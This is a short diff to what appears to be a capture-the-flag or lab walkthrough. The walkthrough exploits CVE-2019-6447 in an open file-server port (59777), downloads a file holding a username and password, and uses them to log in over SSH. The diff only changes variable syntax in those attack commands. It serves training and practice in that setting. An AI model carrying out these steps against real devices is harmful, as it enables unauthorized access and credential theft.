@@ -27,11 +27,11 @@ Yields CVE-2019-6447
 + [+] Done. Saved as 'out.dat'.
 
 After file downloaded, open 
-+ ${IP}:59777/$dir/$.jpg || xdg-open out.dat
++ ${IP}:59777/${dir}/${.jpg} || xdg-open out.dat
 + File gives UN && PW
 
 ### Step 2: SSH
-+ ssh -p 2222 $UN@${IP} 
++ ssh -p 2222 ${UN}@${IP} 
 + ${PW}
 
 ### Information Gathering
